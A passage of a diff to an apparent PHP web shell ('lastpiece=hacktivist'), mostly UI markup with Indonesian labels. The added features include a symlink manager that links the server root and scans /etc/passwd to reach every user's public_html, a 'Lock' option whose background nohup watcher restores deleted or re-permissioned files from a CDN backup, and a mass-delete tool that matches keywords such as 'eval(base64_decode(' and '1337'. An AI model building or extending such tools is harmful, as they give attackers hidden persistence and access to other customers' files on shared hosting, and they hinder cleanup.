+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Lock Manager
+        </button>
         <button onclick="showMassDeleteModal()" class="btn btn-sm" style="border-color: #f85149; color: #f85149;">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
             Mass Delete
@@ -2854,6 +3822,7 @@ body {
                     <?php endif; ?>
                     <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Rename</a>
                     <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>','<?php echo $fd['permission']; ?>')">Chmod</a>
+                    <a href="javascript:void(0)" style="color:#f59e0b;border-color:rgba(245,158,11,0.3);" onclick="showLockModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Lock</a>
                     <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">Delete</a>
                 </div>
             </td>
@@ -2871,62 +3840,154 @@ body {
     </div>
 </footer>
 
-<!-- Delete Confirm Modal -->
+<!-- Delete Confirm Modal (single file) -->
 <div class="modal-overlay hidden" id="deleteConfirmModal">
-    <div class="modal" style="max-width: 400px;">
-        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
-            <span class="modal-title" style="color: var(--red);">Delete Confirmation</span>
-            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    <div class="modal" style="max-width:420px;">
+        <div class="modal-header" style="border-bottom-color:rgba(248,81,73,0.25);background:rgba(248,81,73,0.04);padding:14px 16px;">
+            <span class="modal-title" style="color:#f85149;display:flex;align-items:center;gap:8px;">
+                <span style="display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;background:rgba(248,81,73,0.12);border-radius:6px;border:1px solid rgba(248,81,73,0.28);">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
+                </span>
+                Hapus File
+            </span>
+            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-body" style="text-align: center; padding: 24px;">
-            <div style="width: 60px; height: 60px; background: rgba(248, 81, 73, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="modal-body" style="padding:20px 20px 16px;">
+            <div style="display:flex;gap:14px;align-items:flex-start;margin-bottom:16px;">
+                <div style="flex-shrink:0;width:44px;height:44px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.25);border-radius:10px;display:flex;align-items:center;justify-content:center;">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="1.8"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
+                </div>
+                <div style="flex:1;min-width:0;">
+                    <div style="color:var(--text);font-size:13px;font-weight:600;margin-bottom:4px;">Yakin ingin menghapus?</div>
+                    <div id="deleteFileName" style="color:#f85149;font-family:monospace;font-size:11px;word-break:break-all;background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.18);border-radius:5px;padding:5px 8px;margin-top:6px;line-height:1.5;"></div>
+                </div>
             </div>
-            <p style="color: var(--text); font-size: 14px; margin-bottom: 8px;">Are you sure?</p>
-            <p id="deleteFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all;"></p>
-            <p style="color: var(--text-muted); font-size: 11px; margin-top: 12px;">This action cannot be undone.</p>
+            <div style="background:rgba(248,81,73,0.06);border:1px solid rgba(248,81,73,0.18);border-radius:6px;padding:8px 10px;display:flex;align-items:center;gap:7px;">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                <span style="color:#f87171;font-size:10px;line-height:1.4;">Tindakan ini tidak dapat dibatalkan. File akan dihapus permanen dari server.</span>
+            </div>
         </div>
-        <div class="modal-footer" style="justify-content: center; gap: 12px;">
-            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
-            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background: var(--red); color: white;">Delete</a>
+        <div class="modal-footer" style="justify-content:flex-end;gap:8px;padding:12px 16px;">
+            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()" style="padding:7px 18px;">Batal</button>
+            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background:#f85149;border-color:#f85149;color:#fff;padding:7px 18px;font-weight:600;display:inline-flex;align-items:center;gap:5px;">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
+                Hapus
+            </a>
+        </div>
+    </div>
+</div>
+
+<!-- Universal Confirm Dialog (replaces browser confirm()) -->
+<div class="modal-overlay hidden" id="universalConfirmModal">
+    <div class="modal" style="max-width:420px;">
+        <div class="modal-header" id="uConfirmHeader" style="padding:14px 16px;">
+            <span class="modal-title" id="uConfirmTitle" style="display:flex;align-items:center;gap:8px;"></span>
+            <button class="modal-close" onclick="uConfirmCancel()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body" style="padding:20px;">
+            <div style="display:flex;gap:14px;align-items:flex-start;margin-bottom:16px;">
+                <div id="uConfirmIconWrap" style="flex-shrink:0;width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;"></div>
+                <div style="flex:1;min-width:0;">
+                    <div id="uConfirmMsg" style="color:var(--text);font-size:13px;font-weight:500;line-height:1.5;"></div>
+                    <div id="uConfirmSub" style="color:var(--text-muted);font-size:11px;margin-top:6px;line-height:1.4;"></div>
+                    <div id="uConfirmDetail" style="display:none;font-family:monospace;font-size:11px;word-break:break-all;border-radius:5px;padding:5px 8px;margin-top:8px;line-height:1.5;"></div>
+                </div>
+            </div>
+            <div id="uConfirmWarnBox" style="display:none;border-radius:6px;padding:8px 10px;display:flex;align-items:center;gap:7px;">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                <span id="uConfirmWarnText" style="font-size:10px;line-height:1.4;"></span>
+            </div>
+        </div>
+        <div class="modal-footer" style="justify-content:flex-end;gap:8px;padding:12px 16px;">
+            <button type="button" class="btn btn-secondary" onclick="uConfirmCancel()" id="uConfirmCancelBtn" style="padding:7px 18px;">Batal</button>
+            <button type="button" id="uConfirmOkBtn" onclick="uConfirmOk()" style="padding:7px 20px;border-radius:6px;border:none;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:5px;font-size:13px;"></button>
         </div>
     </div>
 </div>
 
 <!-- Symlink Modal -->
 <div class="modal-overlay hidden" id="symlinkModal">
-    <div class="modal" style="max-width: 480px;">
-        <div class="modal-header" style="border-bottom-color: rgba(167, 139, 250, 0.3);">
+    <div class="modal" style="max-width: 620px; width: 96vw;">
+        <div class="modal-header" style="border-bottom-color: rgba(167,139,250,0.3);">
             <span class="modal-title" style="color: #a78bfa;">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                Create Symlink
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                Symlink Manager
             </span>
-            <button class="modal-close" onclick="hideModal2('symlinkModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+            <button class="modal-close" onclick="hideModal2('symlinkModal')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-body" style="padding: 20px;">
-            <div style="width: 50px; height: 50px; background: rgba(167,139,250,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-            </div>
-            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 4px;">Create in:</p>
-            <p style="color: #00d4ff; font-size: 11px; text-align: center; margin-bottom: 16px; word-break: break-all; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></p>
-            <div class="form-group" style="margin-bottom: 12px;">
-                <label class="form-label">Target Path <span style="color: var(--text-muted); font-weight: 400;">(file or directory to link to)</span></label>
-                <input type="text" id="symlinkTarget" class="form-input" placeholder="e.g. /var/www/html/public or /etc/passwd">
-            </div>
-            <div class="form-group" style="margin-bottom: 0;">
-                <label class="form-label">Link Name <span style="color: var(--text-muted); font-weight: 400;">(name of the symlink)</span></label>
-                <input type="text" id="symlinkName" class="form-input" placeholder="e.g. link_to_public">
-            </div>
-            <div style="background: rgba(167,139,250,0.06); border: 1px solid rgba(167,139,250,0.15); border-radius: 6px; padding: 8px 10px; margin-top: 14px;">
-                <p style="color: #a78bfa; font-size: 10px; font-family: monospace;" id="symlinkPreview">symlink: link_name -> /target/path</p>
-            </div>
+        <!-- Tab bar same as alfafilemanager -->
+        <div style="display:flex;gap:0;border-bottom:1px solid rgba(167,139,250,0.18);background:rgba(0,0,0,0.2);">
+            <button id="symTab_php"    onclick="symSwitchTab('php')"    style="flex:1;padding:8px 4px;font-size:11px;background:rgba(167,139,250,0.18);color:#a78bfa;border:none;border-bottom:2px solid #a78bfa;cursor:pointer;font-weight:700;">Symlink (PHP)</button>
+            <button id="symTab_perl"   onclick="symSwitchTab('perl')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">Symlink (Perl)</button>
+            <button id="symTab_python" onclick="symSwitchTab('python')" style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">Symlink (Python)</button>
+            <button id="symTab_file"   onclick="symSwitchTab('file')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">File Symlink</button>
         </div>
-        <div class="modal-footer" style="justify-content: center; gap: 12px;">
-            <button class="btn btn-secondary" onclick="hideModal2('symlinkModal')">Cancel</button>
-            <button class="btn" style="background: #a78bfa; border-color: #a78bfa; color: #fff; font-weight: 600;" onclick="doCreateSymlink()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                Create Symlink
-            </button>
+        <div class="modal-body" style="padding:16px;min-height:200px;max-height:68vh;overflow-y:auto;">
+
+            <!-- PHP tab -->
+            <div id="symPane_php">
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink <code style="color:#a78bfa;">alfasymlink/root -> /</code> lalu tampilkan semua domain di server beserta link langsung ke public_html.</p>
+                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
+                    <button class="btn" style="background:#a78bfa;border-color:#a78bfa;color:#fff;font-weight:600;" onclick="doSymlinkAction('symphp')">Run Symlink PHP</button>
+                </div>
+                <div id="symResult_php" style="display:none;">
+                    <div id="symRootUrl" style="font-size:10px;color:#00d4ff;font-family:monospace;margin-bottom:8px;word-break:break-all;"></div>
+                    <table style="width:100%;border-collapse:collapse;font-size:11px;" id="symDomainTable">
+                        <thead><tr style="background:rgba(167,139,250,0.12);">
+                            <th style="padding:5px 8px;text-align:left;color:#a78bfa;">#</th>
+                            <th style="padding:5px 8px;text-align:left;color:#22d3ee;">Domain</th>
+                            <th style="padding:5px 8px;text-align:left;color:#fff;">User</th>
+                            <th style="padding:5px 8px;text-align:center;color:#f87171;">Symlink</th>
+                        </tr></thead>
+                        <tbody id="symDomainBody"></tbody>
+                    </table>
+                    <p id="symNoDomains" style="display:none;color:var(--text-muted);font-size:11px;text-align:center;padding:12px;">No domains detected — use File Symlink to link manually.</p>
+                </div>
+            </div>
+
+            <!-- Perl tab -->
+            <div id="symPane_perl" style="display:none;">
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Jalankan script Perl untuk scan <code>/etc/passwd</code> dan buat symlink ke semua public_html user (uid &ge; 500). Butuh Perl &amp; exec tersedia.</p>
+                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
+                    <button class="btn" style="background:#facc15;border-color:#facc15;color:#000;font-weight:600;" onclick="doSymlinkAction('symperl')">Run Symlink Perl</button>
+                </div>
+                <pre id="symResult_perl" style="display:none;background:#0d1117;color:#4ade80;font-size:11px;padding:10px;border-radius:6px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;"></pre>
+            </div>
+
+            <!-- Python tab -->
+            <div id="symPane_python" style="display:none;">
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Jalankan script Python untuk scan <code>/etc/passwd</code> dan buat symlink ke semua public_html user (uid &ge; 500). Butuh Python &amp; exec tersedia.</p>
+                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
+                    <button class="btn" style="background:#34d399;border-color:#34d399;color:#000;font-weight:600;" onclick="doSymlinkAction('sympy')">Run Symlink Python</button>
+                </div>
+                <pre id="symResult_python" style="display:none;background:#0d1117;color:#4ade80;font-size:11px;padding:10px;border-radius:6px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;"></pre>
+            </div>
+
+            <!-- File Symlink tab -->
+            <div id="symPane_file" style="display:none;">
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink ke file atau direktori spesifik. Link dibuat di direktori aktif sekarang.</p>
+                <p style="color:#00d4ff;font-size:10px;font-family:monospace;margin-bottom:12px;word-break:break-all;">Dir: <?php echo htmlspecialchars($currentDirectory); ?></p>
+                <div class="form-group" style="margin-bottom:10px;">
+                    <label class="form-label">Target Path <span style="color:var(--text-muted);font-weight:400;">(file/dir yang di-link)</span></label>
+                    <input type="text" id="symlinkTarget" class="form-input" placeholder="/var/www/html/public atau /etc/passwd">
+                </div>
+                <div class="form-group" style="margin-bottom:10px;">
+                    <label class="form-label">Link Name <span style="color:var(--text-muted);font-weight:400;">(nama symlink yang dibuat)</span></label>
+                    <input type="text" id="symlinkName" class="form-input" placeholder="e.g. link_to_config">
+                </div>
+                <div style="background:rgba(167,139,250,0.06);border:1px solid rgba(167,139,250,0.15);border-radius:6px;padding:6px 10px;margin-bottom:12px;">
+                    <p style="color:#a78bfa;font-size:10px;font-family:monospace;" id="symlinkPreview">symlink: link_name -> /target/path</p>
+                </div>
+                <div style="display:flex;gap:8px;justify-content:center;">
+                    <button class="btn btn-secondary" onclick="hideModal2('symlinkModal')">Cancel</button>
+                    <button class="btn" style="background:#a78bfa;border-color:#a78bfa;color:#fff;font-weight:600;" onclick="doCreateSymlink()">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                        Create Symlink
+                    </button>
+                </div>
+                <div id="symResult_file" style="display:none;margin-top:10px;"></div>
+            </div>
+
         </div>
     </div>
 </div>
@@ -3042,41 +4103,198 @@ body {
 
 <!-- Mass Delete Recursive Modal -->
 <div class="modal-overlay hidden" id="massDeleteModal">
-    <div class="modal" style="max-width: 550px;">
-        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
+    <div class="modal" style="max-width: 560px;">
+        <div class="modal-header" style="border-bottom-color: rgba(248,81,73,0.3);">
             <span class="modal-title" style="color: #f85149;">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-                Mass Delete Recursive
+                Mass Delete by Content
             </span>
             <button class="modal-close" onclick="hideModal2('massDeleteModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-body" style="padding: 16px;">
-            <div style="background: rgba(248,81,73,0.08); border: 1px solid rgba(248,81,73,0.2); border-radius: 6px; padding: 10px; margin-bottom: 14px;">
-                <p style="color: #f85149; font-size: 11px; font-weight: 600;">WARNING: This will recursively scan and delete files. Use with extreme caution!</p>
+        <form method="POST" id="massDelForm" action="?lastpiece=hacktivist&lph=<?php echo urlencode($currentDirectory); ?>">
+            <div class="modal-body" style="padding:16px;">
+                <div style="display:flex;gap:8px;align-items:flex-start;background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.2);border-radius:8px;padding:10px;margin-bottom:14px;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2" style="flex-shrink:0;margin-top:2px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                    <p style="color:#f85149;font-size:11px;line-height:1.6;">Scan rekursif dan hapus semua file yang mengandung keyword yang diinput. Hasil tampil di terminal output.</p>
+                </div>
+                <div class="form-group" style="margin-bottom:10px;">
+                    <label class="form-label">Target Directory</label>
+                    <input type="text" name="target_dir" class="form-input" style="font-family:monospace;font-size:12px;" value="<?php echo htmlspecialchars($currentDirectory); ?>">
+                </div>
+                <div class="form-group" style="margin-bottom:10px;">
+                    <label class="form-label">Mode</label>
+                    <select name="del_mode" id="massDelMode" class="form-input" onchange="toggleMassDelCode()">
+                        <option value="code">Delete files containing specific string/code</option>
+                        <option value="all">Delete ALL files recursively (DANGER)</option>
+                    </select>
+                </div>
+                <div class="form-group" id="massDelCodeGroup" style="margin-bottom:0;">
+                    <label class="form-label">
+                        String / Code to Match
+                        <span style="color:var(--text-muted);font-weight:400;font-size:10px;margin-left:6px;">satu baris = satu keyword (OR match)</span>
+                    </label>
+                    <textarea name="code_content" id="massDelCode" class="editor-area" style="width:100%;height:120px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;" placeholder="Contoh:&#10;nowmeee&#10;filemanager&#10;1337&#10;eval(base64_decode("></textarea>
+                </div>
             </div>
-            <div class="form-group" style="margin-bottom: 10px;">
-                <label class="form-label">Target Directory</label>
-                <input type="text" id="massDelDir" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>">
+            <div class="modal-footer" style="justify-content:space-between;">
+                <button type="button" class="btn btn-secondary" onclick="hideModal2('massDeleteModal')">Cancel</button>
+                <button type="submit" name="do_mass_delete" class="btn" style="background:#f85149;border-color:#f85149;color:#fff;font-weight:600;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                    Scan &amp; Delete
+                </button>
             </div>
-            <div class="form-group" style="margin-bottom: 10px;">
-                <label class="form-label">Mode</label>
-                <select id="massDelMode" class="form-input" onchange="toggleMassDelCode()">
-                    <option value="code">Delete files containing specific code/text</option>
-                    <option value="all">Delete ALL files recursively (DANGER)</option>
-                </select>
-            </div>
-            <div class="form-group" id="massDelCodeGroup" style="margin-bottom: 0;">
-                <label class="form-label">Code/Text to Match <span style="color: var(--text-muted); font-weight: 400;">(paste sample or full code)</span></label>
-                <textarea id="massDelCode" class="editor-area" style="width:100%;height:15vh;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;" placeholder="Paste malicious code signature here...&#10;e.g. eval(base64_decode(&#10;or any unique string to match"></textarea>
-            </div>
-            <div id="massDelResult" style="display:none; margin-top: 10px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-size: 11px; font-family: monospace;"></div>
+        </form>
+    </div>
+</div>
+
+<!-- Lock File Modal -->
+<div class="modal-overlay hidden" id="lockFileModal">
+    <div class="modal" style="max-width:500px;">
+        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);">
+            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
+                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </span>
+                Lock File / Folder
+            </span>
+            <button class="modal-close" onclick="hideModal2('lockFileModal')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-footer" style="justify-content: center; gap: 12px;">
-            <button class="btn btn-secondary" onclick="hideModal2('massDeleteModal')">Cancel</button>
-            <button class="btn" id="massDelBtn" style="background: #f85149; border-color: #f85149; color: #fff; font-weight: 600;" onclick="doMassDeleteRecursive()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-                Execute Delete
+        <div class="modal-body" style="padding:16px;">
+            <!-- How it works -->
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;">
+                <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    <div style="font-size:9px;color:#f59e0b;font-weight:600;">Pantau 1 Detik</div>
+                </div>
+                <div style="background:rgba(74,222,128,0.07);border:1px solid rgba(74,222,128,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>
+                    <div style="font-size:9px;color:#4ade80;font-weight:600;">Auto Restore</div>
+                </div>
+                <div style="background:rgba(99,179,237,0.07);border:1px solid rgba(99,179,237,0.15);border-radius:6px;padding:8px;text-align:center;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#63b3ed" stroke-width="2" style="margin-bottom:4px;display:block;margin-left:auto;margin-right:auto;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    <div style="font-size:9px;color:#63b3ed;font-weight:600;">CDN Backup</div>
+                </div>
+            </div>
+            <!-- Target path -->
+            <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:6px;padding:8px 12px;margin-bottom:12px;word-break:break-all;display:flex;align-items:center;gap:8px;">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="flex-shrink:0;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                <span style="color:#f59e0b;font-family:monospace;font-size:11px;" id="lockModalPath"></span>
+            </div>
+            <!-- Permission picker -->
+            <div class="form-group" style="margin-bottom:10px;">
+                <label class="form-label" style="font-size:11px;color:var(--text-muted);">Permission yang dikunci (chmod)</label>
+                <input type="text" id="lockModalPerm" class="form-input" value="0444" style="font-family:monospace;letter-spacing:2px;font-size:14px;font-weight:600;" maxlength="5">
+                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0444'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:5px;color:#f87171;font-size:10px;font-family:monospace;cursor:pointer;">0444 — read-only</button>
+                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0644'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:5px;color:#f59e0b;font-size:10px;font-family:monospace;cursor:pointer;">0644 — rw-r--r--</button>
+                    <button type="button" onclick="document.getElementById('lockModalPerm').value='0755'" style="flex:1;min-width:120px;padding:6px 8px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);border-radius:5px;color:#4ade80;font-size:10px;font-family:monospace;cursor:pointer;">0755 — rwxr-xr-x</button>
+                </div>
+            </div>
+            <!-- Warning note -->
+            <div style="background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.2);border-radius:5px;padding:8px 10px;font-size:10px;color:#f87171;line-height:1.5;">
+                Watcher berjalan di background (nohup PHP/bash). Jika file dihapus atau chmod berubah, dalam &lt;1 detik akan di-restore dari CDN backup otomatis.
+            </div>
+        </div>
+        <div class="modal-footer" style="justify-content:space-between;gap:10px;">
+            <button class="btn btn-secondary" onclick="hideModal2('lockFileModal')">Cancel</button>
+            <button class="btn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 20px;" onclick="doLockFile()">
